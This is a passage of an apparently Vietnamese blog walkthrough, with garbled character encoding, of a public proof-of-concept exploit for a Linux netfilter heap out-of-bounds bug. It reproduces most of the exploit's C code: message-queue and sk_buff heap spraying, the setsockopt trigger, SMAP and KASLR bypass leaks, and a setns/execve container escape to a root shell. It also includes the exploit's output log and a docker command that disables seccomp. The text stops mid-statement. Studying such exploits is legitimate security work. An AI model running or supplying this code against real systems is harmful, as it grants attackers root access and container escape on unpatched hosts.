ThoÃ¡t container vÃ  nháº£y vÃ o root shell 1 2 3 4 5 6 setns(open(\u0026#34;/proc/1/ns/mnt\u0026#34;, O_RDONLY), 0); setns(open(\u0026#34;/proc/1/ns/pid\u0026#34;, O_RDONLY), 0); setns(open(\u0026#34;/proc/1/ns/net\u0026#34;, O_RDONLY), 0); char *args[] = {\u0026#34;/bin/bash\u0026#34;, \u0026#34;-i\u0026#34;, NULL}; execve(args[0], args, NULL); PhÃ¢n tÃ­ch POC Tiáº¿p theo, chÃºng ta sáº½ Ä‘i phÃ¢n tÃ­ch poc cá»§a Andy Nguyen\nNhÆ° demo, poc cá»§a anh Any Nguyen cho tháº¥y ráº¥t rÃµ cÃ¡c bÆ°á»›c Ä‘á»ƒ khai thÃ¡c tá»« viá»‡c khá»Ÿi táº¡o á»Ÿ STAGE0 Ä‘áº¿n lÃ m trÃ n bá»™ nhá»› á»Ÿ STAGE1, vÆ°á»£t qua SMAP, KSALR, thá»±c thi mÃ£ khai thÃ¡c vÃ  thoÃ¡t khá»i container.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 [+] Linux Privilege Escalation by theflow@ - 2021 [+] STAGE 0: Initialization [*] Setting up namespace sandbox... [*] Initializing sockets and message queues... [+] STAGE 1: Memory corruption [*] Spraying primary messages... [*] Spraying secondary messages... [*] Creating holes in primary messages... [*] Triggering out-of-bounds write... [*] Searching for corrupted primary message... [+] fake_idx: ffc [+] real_idx: fc4 [+] STAGE 2: SMAP bypass [*] Freeing real secondary message... [*] Spraying fake secondary messages... [*] Leaking adjacent secondary message... [+] kheap_addr: ffff91a49cb7f000 [*] Freeing fake secondary messages... [*] Spraying fake secondary messages... [*] Leaking primary message... [+] kheap_addr: ffff91a49c7a0000 [+] STAGE 3: KASLR bypass [*] Freeing fake secondary messages... [*] Spraying fake secondary messages... [*] Freeing sk_buff data buffer... [*] Spraying pipe_buffer objects... [*] Leaking and freeing pipe_buffer object... [+] anon_pipe_buf_ops: ffffffffa1e78380 [+] kbase_addr: ffffffffa0e00000 [+] STAGE 4: Kernel code execution [*] Spraying fake pipe_buffer objects... [*] Releasing pipe_buffer objects... [*] Checking for root... [+] Root privileges gained. [+] STAGE 5: Post-exploitation [*] Escaping container... [*] Cleaning up... [*] Popping root shell... STAGE0 - Khá»Ÿi táº¡o 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 printf(\u0026#34;[+] STAGE 0: Initialization\\n\u0026#34;); printf(\u0026#34;[*] Setting up namespace sandbox...\\n\u0026#34;); if (setup_sandbox() \u0026lt; 0) goto err_no_rmid; printf(\u0026#34;[*] Initializing sockets and message queues...\\n\u0026#34;); if ((s = socket(AF_INET, SOCK_STREAM, 0)) \u0026lt; 0) { perror(\u0026#34;[-] socket\u0026#34;); goto err_no_rmid; } for (int i = 0; i \u0026lt; NUM_SOCKETS; i++) { if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) \u0026lt; 0) { perror(\u0026#34;[-] socketpair\u0026#34;); goto err_no_rmid; } } for (int i = 0; i \u0026lt; NUM_MSQIDS; i++) { if ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) \u0026lt; 0) { perror(\u0026#34;[-] msgget\u0026#34;); goto err_no_rmid; } } printf(\u0026#34;\\n\u0026#34;); msqid stand for: Message queue identifier,\rHÃ m setup_sandbox() cÃ³ tÃ¡c thiáº¿t láº­p giá»›i háº¡n cá»§a CPU (dÃ²ng 11-17) nháº±m má»¥c Ä‘Ã­ch phá»¥c cÃ³ quÃ¡ trÃ¬nh spray cÃ¡c message. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 int setup_sandbox(void) { if (unshare(CLONE_NEWUSER) \u0026lt; 0) { perror(\u0026#34;[-] unshare(CLONE_NEWUSER)\u0026#34;); return -1; } if (unshare(CLONE_NEWNET) \u0026lt; 0) { perror(\u0026#34;[-] unshare(CLONE_NEWNET)\u0026#34;); return -1; } cpu_set_t set; CPU_ZERO(\u0026amp;set); CPU_SET(0, \u0026amp;set); if (sched_setaffinity(getpid(), sizeof(set), \u0026amp;set) \u0026lt; 0) { perror(\u0026#34;[-] sched_setaffinity\u0026#34;); return -1; } return 0; } LÆ°u Ã½, hÃ m unshare á»Ÿ dÃ²ng 2 vÃ  6 cÃ³ thá»ƒ bá»‹ cháº·n bá»Ÿi cÆ¡ cháº¿ Seccomp trÃªn docker. Khi Ä‘Ã³, hoáº·c báº¡n cÃ³ thá»ƒ khÃ´ng gá»i hai lá»‡nh nÃ y, hoáº·c báº¡n cÃ³ thá»ƒ cháº¡y docker vá»›i tÃ¹y chá»n --security-opt seccomp=unconfined:\n1 2 docker run --rm -it --security-opt seccomp=unconfined debian:jessie \\ unshare --map-root-user --user sh -c whoami Sau Ä‘Ã³, chÃºng ta khá»Ÿi táº¡o socket, táº¡o socketpair (dÃ²ng 14-19) vÃ  dÃ¹ng hÃ m msgget() Ä‘á»ƒ táº¡o hÃ ng Ä‘á»£i messages (dÃ²ng 21-26) STAGE1 - LÃ m trÃ n bá»™ nhá»› 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 printf(\u0026#34;[+] STAGE 1: Memory corruption\\n\u0026#34;); printf(\u0026#34;[*] Spraying primary messages...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_MSQIDS; i++) { memset(\u0026amp;msg_primary, 0, sizeof(msg_primary)); *(int *)\u0026amp;msg_primary.mtext[0] = MSG_TAG; *(int *)\u0026amp;msg_primary.mtext[4] = i; if (write_msg(msqid[i], \u0026amp;msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) \u0026lt; 0) goto err_rmid; } printf(\u0026#34;[*] Spraying secondary messages...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_MSQIDS; i++) { memset(\u0026amp;msg_secondary, 0, sizeof(msg_secondary)); *(int *)\u0026amp;msg_secondary.mtext[0] = MSG_TAG; *(int *)\u0026amp;msg_secondary.mtext[4] = i; if (write_msg(msqid[i], \u0026amp;msg_secondary, sizeof(msg_secondary), MTYPE_SECONDARY) \u0026lt; 0) goto err_rmid; } printf(\u0026#34;[*] Creating holes in primary messages...\\n\u0026#34;); for (int i = HOLE_STEP; i \u0026lt; NUM_MSQIDS; i += HOLE_STEP) { if (read_msg(msqid[i], \u0026amp;msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) \u0026lt; 0) goto err_rmid; } printf(\u0026#34;[*] Triggering out-of-bounds write...\\n\u0026#34;); if (trigger_oob_write(s) \u0026lt; 0) goto err_rmid; printf(\u0026#34;[*] Searching for corrupted primary message...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_MSQIDS; i++) { if (i != 0 \u0026amp;\u0026amp; (i % HOLE_STEP) == 0) continue; if (peek_msg(msqid[i], \u0026amp;msg_secondary, sizeof(msg_secondary), 1) \u0026lt; 0) goto err_no_rmid; if (*(int *)\u0026amp;msg_secondary.mtext[0] != MSG_TAG) { printf(\u0026#34;[-] Error could not corrupt any primary message.\\n\u0026#34;); goto err_no_rmid; } if (*(int *)\u0026amp;msg_secondary.mtext[4] != i) { fake_idx = i; real_idx = *(int *)\u0026amp;msg_secondary.mtext[4]; break; } } if (fake_idx == -1 \u0026amp;\u0026amp; real_idx == -1) { printf(\u0026#34;[-] Error could not corrupt any primary message.\\n\u0026#34;); goto err_no_rmid; } // fake_idx\u0026#39;s primary message has a corrupted next pointer; wrongly // pointing to real_idx\u0026#39;s secondary message. printf(\u0026#34;[+] fake_idx: %x\\n\u0026#34;, fake_idx); printf(\u0026#34;[+] real_idx: %x\\n\u0026#34;, real_idx); printf(\u0026#34;\\n\u0026#34;); Spraying primary messages Cáº¥u trÃºc cá»§a primary messages Ä‘Æ°á»£c xÃ¢y dá»±ng: 1 2 3 4 struct { long mtype; char mtext[PRIMARY_SIZE - MSG_MSG_SIZE]; } msg_primary; vá»›i MSG_MSG_SIZE lÃ  kÃ­ch thÆ°á»›c cá»§a cáº¥u trÃºc msg_msg:\n1 2 3 4 5 6 7 8 9 10 #define MSG_MSG_SIZE (sizeof(struct msg_msg)) struct msg_msg { uint64_t m_list_next; uint64_t m_list_prev; uint64_t m_type; uint64_t m_ts; uint64_t next; uint64_t security; }; HÃ m write_msg: 1 2 3 4 5 6 7 8 int write_msg(int msqid, const void *msgp, size_t msgsz, long msgtyp) { *(long *)msgp = msgtyp; if (msgsnd(msqid, msgp, msgsz - sizeof(long), 0) \u0026lt; 0) { perror(\u0026#34;[-] msgsnd\u0026#34;); return -1; } return 0; } HÃ m nÃ y gá»i msgsnd Ä‘á»ƒ gá»­i nhá»¯ng message cÃ³ kÃ­ch thÆ°á»›c lÃ  4096. Cáº¥u trÃºc msg_primary báº¯t nguá»“n tá»« lá»‡nh nÃ y\nTham sá»‘ thá»© ba Ä‘Æ°á»£c truyá»n lÃ  msgsz - sizeof(long) vÃ¬ tham sá»‘ nÃ y láº¥y kÃ­ch thÆ°á»›c cá»§a pháº§n mtext, nÃªn chÃºng ta láº¥y kÃ­ch thÆ°á»›c cá»§a cáº£ cáº¥u trÃºc msg_primary trá»« cho kÃ­ch thÆ°á»›c cá»§a mtype.\nÄá»ƒ hiá»ƒu chi tiáº¿t hÆ¡n, báº¡n cÃ³ thá»ƒ Ä‘á»c á»Ÿ Ä‘Ã¢y .\ndÃ²ng 6-7 dÃ¹ng vá»›i má»¥c Ä‘Ã­ch kiá»ƒm tra double reference á»Ÿ cÃ¡c bÆ°á»›c sau. Spraying second messages 1 2 3 4 5 6 7 8 9 printf(\u0026#34;[*] Spraying secondary messages...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_MSQIDS; i++) { memset(\u0026amp;msg_secondary, 0, sizeof(msg_secondary)); *(int *)\u0026amp;msg_secondary.mtext[0] = MSG_TAG; *(int *)\u0026amp;msg_secondary.mtext[4] = i; if (write_msg(msqid[i], \u0026amp;msg_secondary, sizeof(msg_secondary), MTYPE_SECONDARY) \u0026lt; 0) goto err_rmid; } Táº¡o secondary message tÆ°Æ¡ng tá»± vá»›i táº¡o primary messages, chá»‰ khÃ¡c lÃ  kÃ­ch thÆ°á»›c cá»§a msg_secondary lÃºc nÃ y lÃ  1024 thay vÃ¬ 4096, do Ä‘Ã³, cáº¥u trÃºc cá»§a msg_secondary sáº½ lÃ : 1 2 3 4 struct { long mtype; char mtext[SECONDARY_SIZE - MSG_MSG_SIZE]; } msg_secondary; Vá»›i SECONDARY_SIZE = 1024.\nCreating holes in primary messages 1 2 3 4 5 6 printf(\u0026#34;[*] Creating holes in primary messages...\\n\u0026#34;); for (int i = HOLE_STEP; i \u0026lt; NUM_MSQIDS; i += HOLE_STEP) { if (read_msg(msqid[i], \u0026amp;msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) \u0026lt; 0) goto err_rmid; } DÃ¹ng vÃ²ng for Ä‘á»ƒ giáº£i phÃ³ng cÃ¡c primary message vá»›i HOLE_STEP = 1024 vÃ  NUM_MSQIDS = 4096. HÃ m read_msg Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a nhÆ° sau: 1 2 3 4 5 6 7 int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) { if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0) \u0026lt; 0) { perror(\u0026#34;[-] msgrcv\u0026#34;); return -1; } return 0; } Dá»… tháº¥y, read_msg vÃ  write_msg lÃ  má»™t cáº·p hÃ m gá»i tÆ°Æ¡ng á»©ng cÃ¡c lá»‡nh msgsnd vÃ  msgrcv Ä‘á»ƒ gá»­i vÃ  nháº­n cÃ¡c messages. Vá»›i msgrcv, sau khi nháº­n xong, nÃ³ sáº½ giáº£i phÃ³ng vÃ¹ng nhá»› Ä‘Æ°á»£c nháº­n, do Ä‘Ã³, nÃ³ sáº½ táº¡o ra cÃ¡c lá»— há»•ng cÃ³ kÃ­ch thÆ°á»›c báº±ng 1024 trong cÃ¡c primary message.\nTriggering out-of-bounds write\u0026hellip; 1 2 3 printf(\u0026#34;[*] Triggering out-of-bounds write...\\n\u0026#34;); if (trigger_oob_write(s) \u0026lt; 0) goto err_rmid; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 int trigger_oob_write(int s) { struct __attribute__((__packed__)) { struct ipt_replace replace; struct ipt_entry entry; struct xt_entry_match match; char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2]; struct xt_entry_target target; } data = {0}; data.replace.num_counters = 1; data.replace.num_entries = 1; data.replace.size = (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad) + sizeof(data.target)); data.entry.next_offset = (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad) + sizeof(data.target)); data.entry.target_offset = (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad)); data.match.u.user.match_size = (sizeof(data.match) + sizeof(data.pad)); strcpy(data.match.u.user.name, \u0026#34;icmp\u0026#34;); data.match.u.user.revision = 0; data.target.u.user.target_size = sizeof(data.target); strcpy(data.target.u.user.name, \u0026#34;NFQUEUE\u0026#34;); data.target.u.user.revision = 1; // Partially overwrite the adjacent buffer with 2 bytes of zero. if (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, \u0026amp;data, sizeof(data)) != 0) { if (errno == ENOPROTOOPT) { printf(\u0026#34;[-] Error ip_tables module is not loaded.\\n\u0026#34;); return -1; } } return 0; } HÃ m trigger_oob_write má»¥c Ä‘Ã­ch lÃ  kÃ­ch hoáº¡t lá»—i heap out-of-bound Ä‘Æ°á»£c Ä‘á»ƒ cáº­p á»Ÿ trÃªn. HÃ m setsockopt Ä‘Æ°á»£c gá»i lÃ  dÃ²ng 29 cÃ³ optname lÃ  IPT_SO_SET_REPLACE káº¿t há»£p vá»›i tÃ¹y chá»n CAP_NET_ADMIN khi táº¡o docker sáº½ kÃ­ch hoáº¡t hÃ m xt_compat_target_from_user() - hÃ m chá»©a lá»—i heap-out-of-bound. DÃ²ng 25 tÃ¡c giáº£ sá»­ dá»¥ng cáº¥u trÃºc NFQUEUE Ä‘á»ƒ kiá»ƒm soÃ¡t giÃ¡ trá»‹ cá»§a target-\u0026gt;targetsize. Vá» cáº¥u trÃºc cá»§a data, tÃ´i váº«n chÆ°a thá»±c sá»± hiá»ƒu. á» Ä‘Ã¢y, tÃ¡c giáº£ dÃ¹ng khai bÃ¡o struct __attribute__((__packed__)) Ä‘á»ƒ cho phÃ©p cáº¥u trÃºc cá»§a data cÃ³ kÃ­ch thÆ°á»›c nhá» hÆ¡n báº±ng báº±ng kÃ­ch thÆ°á»›c align (memory alignment); cÃ¡c cáº¥u trÃºc ipt_* lÃ  cÃ¡c cáº¥u trÃºc Ä‘Æ°á»£c sá»­ dá»¥ng trong netfilter vÃ  cÃ³ má»‘i quan há»‡ nhÆ° hÃ¬nh bÃªn:\n. Searching for corrupted primary message 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 printf(\u0026#34;[*] Searching for corrupted primary message...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_MSQIDS; i++) { if (i != 0 \u0026amp;\u0026amp; (i % HOLE_STEP) == 0) continue; if (peek_msg(msqid[i], \u0026amp;msg_secondary, sizeof(msg_secondary), 1) \u0026lt; 0) goto err_no_rmid; if (*(int *)\u0026amp;msg_secondary.mtext[0] != MSG_TAG) { printf(\u0026#34;[-] Error could not corrupt any primary message.\\n\u0026#34;); goto err_no_rmid; } if (*(int *)\u0026amp;msg_secondary.mtext[4] != i) { fake_idx = i; real_idx = *(int *)\u0026amp;msg_secondary.mtext[4]; break; } } if (fake_idx == -1 \u0026amp;\u0026amp; real_idx == -1) { printf(\u0026#34;[-] Error could not corrupt any primary message.\\n\u0026#34;); goto err_no_rmid; } // fake_idx\u0026#39;s primary message has a corrupted next pointer; wrongly // pointing to real_idx\u0026#39;s secondary message. printf(\u0026#34;[+] fake_idx: %x\\n\u0026#34;, fake_idx); printf(\u0026#34;[+] real_idx: %x\\n\u0026#34;, real_idx); DÃ¹ng vÃ²ng for tá»« dÃ²ng 2-10 Ä‘á»ƒ kiá»ƒm tra táº¥t cáº£ cÃ¡c message Ä‘Ã£ Ä‘Æ°á»£c cáº¥p phÃ¡t HÃ m peek_msg() Ä‘á»ƒ Ä‘á»c giÃ¡ trá»‹ cá»§a cÃ¡c message vÃ  lÆ°u vÃ o msg_secondary, Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a nhÆ° sau: 1 2 3 4 5 6 7 8 int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) { if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, MSG_COPY | IPC_NOWAIT) \u0026lt; 0) { perror(\u0026#34;[-] msgrcv\u0026#34;); return -1; } return 0; } KhÃ¡ giá»‘ng vá»›i hÃ m read_msg Ä‘á»u gá»i hÃ m msgrcv, Ä‘iá»ƒm khÃ¡c biá»‡t duy nháº¥t lÃ  msgflg cÃ³ giÃ¡ trá»‹ lÃ  MSG_COPY | IPC_NOWAIT\nDÃ²ng 11-15 , dÃ¹ng giÃ¡ trá»‹ cá»§a msg_secondary.mtext[4] Ä‘á»ƒ kiá»ƒm tra xem liá»‡u cÃ³ xuáº¥t hiá»‡n trÆ°á»ng há»£p 2 cáº¥u trÃºc cÃ¹ng tham kháº£o Ä‘áº¿n má»™t Ä‘á»‹a chá»‰ hay khÃ´ng. á» bÆ°á»›c khá»Ÿi táº¡o, chÃºng ta gÃ¡n má»—i giÃ¡ trá»‹ msg_secondary.mtext[4] lÃ  má»™t giÃ¡ trá»‹ chá»‰ sá»‘ i tÆ°Æ¡ng á»©ng, trong bÆ°á»›c nÃ y, náº¿u tá»“n táº¡i má»™t message cÃ³ msg_secondary.mtext[4] khÃ¡c vá»›i chá»‰ sá»‘ tÆ°Æ¡ng á»©ng cá»§a nÃ³, Ä‘iá»u Ä‘Ã³ cÃ³ nghÄ©a message nÃ y Ä‘ang trá» tá»›i má»™t cáº¥u trÃºc khÃ¡c trÃªn primary_message. STAGE 2: SMAP bypass Freeing real secondary message\u0026hellip; 1 2 3 4 printf(\u0026#34;[*] Freeing real secondary message...\\n\u0026#34;); if (read_msg(msqid[real_idx], \u0026amp;msg_secondary, sizeof(msg_secondary), MTYPE_SECONDARY) \u0026lt; 0) goto err_rmid; Giá»‘ng nhÆ° nhá»¯ng stage trÆ°á»›c, Ä‘á»ƒ giáº£i phÃ³ng cÃ¡c messages Ä‘Ã£ Ä‘Æ°á»£c cáº¥p phÃ¡t, ta dÃ¹ng lá»‡nh read_msg Ä‘á»ƒ Ä‘á»c message rá»“i giáº£i phÃ³ng vÃ¹ng nhá»› Ä‘Ã³.\nSpraying fake secondary messages\u0026hellip; 1 2 3 4 5 memset(secondary_buf, 0, sizeof(secondary_buf)); build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242, PAGE_SIZE - MSG_MSG_SIZE, 0); if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) \u0026lt; 0) goto err_rmid; Sau khi Ä‘Ã£ giáº£i phÃ³ng message gá»‘c, chÃºng ta táº¡o ra má»™t fake secondary message thÃ´ng qua hÃ m build_msg_msg: 1 2 3 4 5 6 7 8 9 void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev, uint64_t m_ts, uint64_t next) { msg-\u0026gt;m_list_next = m_list_next; msg-\u0026gt;m_list_prev = m_list_prev; msg-\u0026gt;m_type = MTYPE_FAKE; msg-\u0026gt;m_ts = m_ts; msg-\u0026gt;next = next; msg-\u0026gt;security = 0; } Tiáº¿n hÃ nh spray cáº¥u trÃºc skbuff báº±ng lá»‡nh skbuff: 1 2 3 4 5 6 7 8 9 10 11 int spray_skbuff(int ss[NUM_SOCKETS][2], const void *buf, size_t size) { for (int i = 0; i \u0026lt; NUM_SOCKETS; i++) { for (int j = 0; j \u0026lt; NUM_SKBUFFS; j++) { if (write(ss[i][0], buf, size) \u0026lt; 0) { perror(\u0026#34;[-] write\u0026#34;); return -1; } } } return 0; } skbuff lÃ  má»™t nguyÃªn liá»‡u tuyá»‡t vá»i Ä‘á»ƒ táº¡o UAF, thao tÃ¡c nÃ y lÃ m cho cáº¥u trÃºc skbuf trá» tá»›i fake message cá»§a chÃºng ta. Khi chÃºng ta giáº£i phÃ³ng fake message, cáº¥u trÃºc sk_buff váº«n cÃ²n vÃ  trá» tá»›i vá»‹ trÃ­ fake_message cá»§a mÃ¬nh.\nÄá»ƒ thá»±c hiá»‡n spray, ta dÃ¹ng hai vÃ²ng for, vÃ²ng thá»© nháº¥t Ä‘i qua táº¥t cáº£ cÃ¡c cáº·p SOCKETS Ä‘Æ°á»£c khá»Ÿi táº¡o, vÃ²ng thá»© 2 Ä‘i qua táº¥t cáº£ cÃ¡c cáº¥u trÃºc sk_buff Ä‘ang cÃ³ trÃªn má»—i cáº·p socket rá»“i dÃ¹ng lá»‡nh write Ä‘á»ƒ cáº¥p phÃ¡t vÃ  ghi ná»™i dung fake secondary message cá»§a chÃºng ta.\nLeaking adjacent secondary message 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // Use the fake secondary message to read out-of-bounds. printf(\u0026#34;[*] Leaking adjacent secondary message...\\n\u0026#34;); if (peek_msg(msqid[fake_idx], \u0026amp;msg_fake, sizeof(msg_fake), 1) \u0026lt; 0) goto err_rmid; // Check if the leak is valid. if (*(int *)\u0026amp;msg_fake.mtext[SECONDARY_SIZE] != MSG_TAG) { printf(\u0026#34;[-] Error could not leak adjacent secondary message.\\n\u0026#34;); goto err_rmid; } // The secondary message contains a pointer to the primary message. msg = (struct msg_msg *)\u0026amp;msg_fake.mtext[SECONDARY_SIZE - MSG_MSG_SIZE]; kheap_addr = msg-\u0026gt;m_list_next; if (kheap_addr \u0026amp; (PRIMARY_SIZE - 1)) kheap_addr = msg-\u0026gt;m_list_prev; printf(\u0026#34;[+] kheap_addr: %\u0026#34; PRIx64 \u0026#34;\\n\u0026#34;, kheap_addr); if ((kheap_addr \u0026amp; 0xFFFF000000000000) != 0xFFFF000000000000) { printf(\u0026#34;[-] Error kernel heap address is incorrect.\\n\u0026#34;); goto err_rmid; } Sau khi spray Ä‘á»ƒ cáº¥u trÃºc sk_buff trá» Ä‘áº¿n fake message, ta cáº§n leak Ä‘á»‹a chá»‰ cá»§a secondary message káº¿ tiáº¿p. Ta cáº§n Ä‘á»‹a chá»‰ nÃ y Ä‘á»ƒ cÃ³ thá»ƒ giáº£i phÃ³ng vÃ¹ng nhá»› táº¡i Ä‘Ã³. Vá»›i cáº¥u trÃºc cá»§a msg_fake lÃ : 1 2 3 4 struct { long mtype; char mtext[PAGE_SIZE - MSG_MSG_SIZE + PAGE_SIZE - MSG_MSGSEG_SIZE]; } msg_fake; á» Ä‘Ã¢y, mtext Ä‘Æ°á»£c cáº¥p phÃ¡t vá»›i kÃ­ch thÆ°á»›c lÃ  PAGE_SIZE - MSG_MSG_SIZE + PAGE_SIZE - MSG_MSGSEG_SIZE,\n1 2 3 4 #define MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg)) struct msg_msgseg { uint64_t next; }; DÃ¹ng hÃ m peek_msg Ä‘á»ƒ láº¥y fake_message táº¡i index fake_idx, lÆ°u vÃ o msg_fake. CÃ¢u lá»‡nh á»Ÿ dÃ²ng 7 Ä‘á»ƒ Ä‘Ã¡m báº£o ráº±ng message chÃºng ta láº¥y ra lÃ  fake_message. VÃ¬ táº¥t cáº£ cÃ¡c message gá»‘c, khi khá»Ÿi táº¡o Ä‘á»u gÃ¡n giÃ¡ trá»‹ táº¡i msg/mtext[SECONDARY_SIZE] = MSG_TAG. Trong cáº¥u trÃºc struct msg_msg cÃ³ má»™t trÆ°á»ng lÃ  m_ts Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ xÃ¡c Ä‘á»‹nh kÃ­ch thÆ°á»›c dá»¯ liá»‡u tráº£ láº¡i cho user vá»›i kÃ­ch thÆ°á»›c gá»‘c lÃ  1024-sizeof(struct msg_msg). Tuy nhiÃªn, chÃºng ta Ä‘Ã£ cáº¥p phÃ¡t vá»›i PAGESIZE = 4096 do Ä‘Ã³, kÃ­ch thÆ°á»›c nÃ y cÃ³ giÃ¡ trá»‹ lÃ  4096 - sizeof(struct msg_msg). ChÃ­nh Ä‘iá»u nÃ y cho phÃ©p chÃºng ta Ä‘á»c Ä‘Æ°á»£c giÃ¡ trá»‹ cá»§a cáº¥u trÃºc liá»n ká».\nDo Ä‘Ã³, táº¡i dÃ²ng 13 láº¥y Ä‘á»‹a chá»‰ cá»§a cáº¥u trÃºc msg_msg tiáº¿p theo tá»« msg_fake. Sau Ä‘Ã³, láº¥y Ä‘á»‹a chá»‰ cá»§a trÆ°á»ng m_list_next vÃ  lÆ°u vÃ o kheap_addr. VÃ¬ kheap_addr lÃ  nÆ¡i báº¯t Ä‘áº§u cá»§a cÃ¡c primary message nÃªn nÃ³ sáº½ lÃ  bá»™i cá»§a PRIMARY_SIZE, phÃ©p toÃ¡n kheap_addr \u0026amp; (PRIMARY_SIZE - 1) á»Ÿ dÃ²ng 15 tÆ°Æ¡ng Ä‘Æ°Æ¡ng vá»›i kheap_addr mod PRIMARY_SIZE Ä‘á»ƒ kiá»ƒm tra xem m_list_next cÃ³ pháº£i lÃ  Ä‘á»‹a chá»‰ cá»§a message káº¿ tiáº¿p khÃ´ng, náº¿u khÃ´ng pháº£i thÃ¬ nÃ³ sáº½ Ä‘Æ°á»£c gÃ¡n giÃ¡ trá»‹ m_list_prev. CÃ¢u lá»‡nh if á»Ÿ dÃ²ng 19-22 Ä‘á»ƒ kiá»ƒm tra xem Ä‘á»‹a chá»‰ cá»§a chÃºng ta cÃ³ há»£p lá»‡ khÃ´ng. Freeing fake secondary messages\u0026hellip; 1 2 printf(\u0026#34;[*] Freeing fake secondary messages...\\n\u0026#34;); free_skbuff(ss, secondary_buf, sizeof(secondary_buf)); 1 2 3 4 5 6 7 8 9 10 11 int free_skbuff(int ss[NUM_SOCKETS][2], void *buf, size_t size) { for (int i = 0; i \u0026lt; NUM_SOCKETS; i++) { for (int j = 0; j \u0026lt; NUM_SKBUFFS; j++) { if (read(ss[i][1], buf, size) \u0026lt; 0) { perror(\u0026#34;[-] read\u0026#34;); return -1; } } } return 0; } BÆ°á»›c tiáº¿p theo giáº£i phÃ³ng vÃ¹ng nhá»› fake_secondary messages. TÆ°Æ¡ng tá»± nhÆ° hÃ m spray_skbuff, hÃ m free_skbuff dÃ¹ng 2 vÃ²ng for Ä‘á»ƒ Ä‘i qua táº¥t cáº£ cÃ¡c cáº·p sockets vÃ  táº¥t cáº£ cÃ¡c cáº¥u trÃºc sk_buff trÃªn tá»«ng cáº·p socker Ä‘á»ƒ Ä‘á»c dá»¯ liá»‡u tá»« vÃ¹ng nhá»› Ä‘Ã£ Ä‘Æ°á»£c ghi vÃ o ss báº±ng lá»‡nh read. Lá»‡nh read sau Ä‘i Ä‘á»c xong sáº½ tiáº¿n hÃ nh giáº£i phÃ²ng vÃ¹ng nhá»› nÃ y VÃ  Ä‘á»«ng quÃªn, cáº¥u trÃºc sk_buff trá» vÃ o vÃ¹ng nhá»› vá»«a Ä‘Æ°á»£c giáº£i phÃ³ng váº«n cÃ²n tá»“n táº¡i.\nSpraying fake secondary messages\u0026hellip; 1 2 3 4 5 6 7 8 // Put kheap_addr at next to leak its content. Assumes zero bytes before // kheap_addr. printf(\u0026#34;[*] Spraying fake secondary messages...\\n\u0026#34;); memset(secondary_buf, 0, sizeof(secondary_buf)); build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242, sizeof(msg_fake.mtext), kheap_addr - MSG_MSGSEG_SIZE); if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) \u0026lt; 0) goto err_rmid; ChÃºng ta xÃ¢y dá»±ng láº¡i má»™t fake secondary message, nhÆ°ng láº§n nÃ y, chÃºng ta xÃ¢y dá»±ng vá»›i msg-\u0026gt;next = kheap_addr - MSG_MSGSEG_SIZE, vá»›i kheap_addr lÃ  Ä‘á»‹a chá»‰ Ä‘Æ°á»£c leak tá»« step trÆ°á»›c. Ta tiáº¿n hÃ nh spray báº±ng lá»‡nh spray_skbuff. Leaking primary message\u0026hellip; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // Use the fake secondary message to read from kheap_addr. printf(\u0026#34;[*] Leaking primary message...\\n\u0026#34;); if (peek_msg(msqid[fake_idx], \u0026amp;msg_fake, sizeof(msg_fake), 1) \u0026lt; 0) goto err_rmid; // Check if the leak is valid. if (*(int *)\u0026amp;msg_fake.mtext[PAGE_SIZE] != MSG_TAG) { printf(\u0026#34;[-] Error could not leak primary message.\\n\u0026#34;); goto err_rmid; } // The primary message contains a pointer to the secondary message. msg = (struct msg_msg *)\u0026amp;msg_fake.mtext[PAGE_SIZE - MSG_MSG_SIZE]; kheap_addr = msg-\u0026gt;m_list_next; if (kheap_addr \u0026amp; (SECONDARY_SIZE - 1)) kheap_addr = msg-\u0026gt;m_list_prev; // Calculate the address of the fake secondary message. kheap_addr -= SECONDARY_SIZE; printf(\u0026#34;[+] kheap_addr: %\u0026#34; PRIx64 \u0026#34;\\n\u0026#34;, kheap_addr); if ((kheap_addr \u0026amp; 